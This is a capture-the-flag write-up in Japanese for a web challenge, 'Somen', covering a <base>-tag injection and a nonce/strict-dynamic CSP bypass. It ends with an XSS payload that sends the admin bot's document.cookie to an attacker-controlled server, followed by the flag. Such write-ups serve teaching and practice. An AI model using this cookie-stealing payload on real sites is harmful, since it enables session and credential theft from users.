# Somen
421 pt (20 Solves)
```
Somen is tasty.
[url]
```

<details>
  <summary>worker.js</summary>
  
  ```js
  const puppeteer = require('puppeteer');

/* ... ... */

// initialize
const browser = await puppeteer.launch({
    executablePath: 'google-chrome-unstable',
    headless: true,
    args: [
        '--no-sandbox',
        '--disable-background-networking',
        '--disk-cache-dir=/dev/null',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-gpu',
        '--disable-sync',
        '--disable-translate',
        '--hide-scrollbars',
        '--metrics-recording-only',
        '--mute-audio',
        '--no-first-run',
        '--safebrowsing-disable-auto-update',
    ],
});
const page = await browser.newPage();

// set cookie
await page.setCookie({
    name: 'flag',
    value: process.env.FLAG,
    domain: process.env.DOMAIN,
    expires: Date.now() / 1000 + 10,
});

// access
// username is the input value of players
const url = `[url]/?username=${encodeURIComponent(username)}`;
try {
    await page.goto(url, {
        waitUntil: 'networkidle0',
        timeout: 5000,
    });
} catch (err) {
    console.log(err);
}

// finalize
await page.close();
await browser.close();

/* ... ... */
  ```
</details>
<details>
  <summary>index.php</summary>
  
  ```php
  <?php
$nonce = base64_encode(random_bytes(20));
header("Content-Security-Policy: default-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='");
?>

<head>
    <title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>

    <script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
    <script nonce="<?= $nonce ?>">
        const choice = l => l[Math.floor(Math.random() * l.length)];

        window.onload = () => {
            const username = new URL(location).searchParams.get("username");
            const adjective = choice(["Nagashi", "Hiyashi"]);
            if (username !== null)
                document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
        }
    </script>
</head>

<body>
    <h1>Best somen for You</h1>

    <p>Please input your name. You can use only alphabets and digits.</p>
    <p>This page works fine with latest Google Chrome / Chromium. We won't support other browsers :P</p>
    <p id="message"></p>
    <form action="/" method="GET">
        <input type="text" name="username" place="Your name"></input>
        <button type="submit">Ask</button>
    </form>
    <hr>

    <p> If your name causes suspicious behavior, please tell me that from the following form. Admin will acceess /?username=${encodeURIComponent(your input)} and see what happens.</p>
    <form action="/inquiry" method="POST">
        <input type="text" name="username" place="Your name"></input>
        <button type="submit">Ask</button>
    </form>

</body>
  ```
</details>

## 概要
テキストボックスが2つある。1個は自分で実行、もう1個はクローラーに実行させる。  
usernameに入力した内容が挿入されるので、XSSだろう。
しかし`security.js`とCSPの所為で全然上手くいかない。

`worker.js`をみるとcookieにflagがあるのがわかる。  

## 解
目標は2つ。
1. security.jsの制限をバイパス
1. CSPのバイパス

#### security.jsの制限をバイパス

```html
</title><base href="//example.com">
```

これを書き込むと以下のような状態になる。

```html
<base href="//example.com">  
<script src="./security.js">
```

`./security.js`は`example.com/security.js`として処理され、コンソールログに404が表示される。  

#### CSPのバイパス
`security.js`はバイパスできたので次はCSPのバイパスを目指す。  
CSPの`nonce`と`strict-dynamic`のバイパスを調べてたら[良さげな記事](https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3)。case23が似てる状況。  
既に実行を許可されたscriptタグの中に任意のjsを埋め込みたい。
case23を参考にとりあえず書いてみる。

```html
<p id="message">[username], I recommend Nagashi somen for you.</p>
```

のように代入されてるので、idがmessageなscriptタグを作る。

```
alert();//</title><script id="message"></script><base href="http://example.com">
```

上を入力するとHTMLは以下のようになる。HTMLとしては壊れてるけど、よしなにしてくれる。  
titleに代入されたうえでidがmessageなとこに代入されるので結構ごちゃごちゃ。

```html
 <title>Best somen for alert();//</title>
 <script id="message">
 alert();//</title><script id="message"></script><base href="http://example.com">, I recommend Nagashi somen for you.
 </script><base href="http://example.com">
```

アクセスされたときにurlを表示するようなwebサーバを用意して

```
document.location=`/?q=${encodeURIComponent(document.cookie)}`;//</title><script id="message"></script><base href="[url]">
```

を入力すればflag。

```
ctf4b{1_w0uld_l1k3_70_347_50m3n_b3f0r3_7ry1n6_70_3xpl017}
```